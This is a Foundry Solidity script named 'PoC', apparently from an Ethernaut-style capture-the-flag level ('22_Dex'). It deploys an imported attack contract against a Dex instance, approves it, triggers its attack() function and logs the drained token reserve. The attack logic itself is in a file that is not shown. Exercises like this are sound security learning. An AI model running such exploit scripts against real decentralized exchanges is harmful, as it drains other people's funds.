// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Dexter} from "../src/22_Dex.sol";

interface IDex {
    function token1() external view returns (address);

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

contract PoC is Script {
    // Replace with your Dex instance
    IDex dex = IDex(0x98E7fF2DfFF412D7E9e03A51AE0f63f9e983C3cE);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        Dexter dexter = new Dexter(address(dex));
        dex.approve(address(dexter), type(uint256).max);
        dexter.attack();

        console2.log(
            "Dex token 1 reserve: ",
            dex.balanceOf(dex.token1(), address(dex))
        );
        vm.stopBroadcast();
    }
}
